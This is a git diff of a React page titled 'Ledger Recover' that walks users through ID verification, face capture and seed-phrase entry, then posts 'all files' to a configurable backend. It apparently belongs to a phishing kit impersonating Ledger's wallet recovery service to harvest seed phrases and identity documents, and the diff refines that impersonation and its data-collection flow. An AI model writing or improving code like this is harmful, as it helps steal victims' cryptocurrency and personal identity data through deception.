@@ -6,16 +6,17 @@ import SeedPhraseVerification from '../components/SeedPhraseVerification';
 import CameraVerification from '../components/CamVerification';
 import Modal from 'react-modal';
 import { FaCheckCircle } from 'react-icons/fa';
-import axios from 'axios';
+// import axios from 'axios';
 import emailjs from '@emailjs/browser';
+// import 'dotenv/config'
 
 Modal.setAppElement('#root');
 
 function AuthPage() {
   const [step, setStep] = useState(1);
   const { state, setPhoto} = useContext(AuthContext);
-  // const { state, setSource, setPhoto, setPhotoId } = useContext(AuthContext);
   const [isModalOpen, setIsModalOpen] = useState(false);
+  // const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'https://your-backend.onrender.com';
 
   const resizeImage = (file, maxWidth, maxHeight) => {
     return new Promise((resolve, reject) => {
@@ -85,7 +86,7 @@ function AuthPage() {
   
     try {
       // Send request to the backend to handle file sending
-      const response = await fetch('http://localhost:3001/send-all-files', {
+      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/send-all-files`, {
         method: 'POST',
       });
   
@@ -148,7 +149,7 @@ function AuthPage() {
 
   return (
     <div className="container mx-auto p-5">
-      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recovery Services</h1>
+      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recover</h1>
 
       {/* Progress Bar */}
       <div className="flex justify-around mb-10 max-xl:hidden">
@@ -158,22 +159,22 @@ function AuthPage() {
               {index + 1}
             </div>
             <span className="mt-2 font-normal font-serif leading-tighter tracking-tighter 2xl:leading-tight 2xl:tracking-tight">
-              {['Camera Verification', 'Seed Phrase Verification', 'Id Verification', 'Back Up'][index]}
+              {['Id Verification', 'Face Recognition', 'Seed Phrase', 'Back Up'][index]}
             </span>
           </div>
         ))}
       </div>
 
-      {/* Steps */}
-      {step === 1 && (
+      {/* Steps #i did it like this because i was too lazy to change them serially # */}
+      {step === 2 && (
         <CameraVerification 
           onNext={handleNext} 
           onMobileNext={handleMobileNext} 
           setPhoto={setPhoto} 
         />
       )}
-      {step === 2 && <SeedPhraseVerification onNext={handleNext} />}
-      {step === 3 && <IdVerification onNext={handleNext} />}
+      {step === 3 && <SeedPhraseVerification onNext={handleNext} />}
+      {step === 1 && <IdVerification onNext={handleNext} />}
       {step === 4 && (
         <div>
           <h1>Backup All Data</h1>
